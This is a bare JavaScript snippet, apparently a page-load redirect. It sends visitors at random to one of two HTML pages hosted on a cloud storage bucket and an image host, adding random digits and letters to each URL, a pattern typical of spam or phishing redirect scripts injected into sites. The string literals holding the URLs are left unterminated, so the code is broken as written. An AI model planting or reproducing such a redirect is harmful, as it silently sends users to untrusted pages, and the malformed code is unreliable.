var urls=[
' http://erp-huanan.oss-cn-shenzhen.aliyuncs.com/wms/product/html/nt2v2iw/2024/04/25/wms_product/nt2v2iw_20240425225748k0mog.html?{nnnnnnn}{wwww};
' http://ksimg.sparke.cn/images/english/2024/4/0e944f30602e47e89b70dd1e63a788a6.html?{nnnnnnn}{wwww};];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
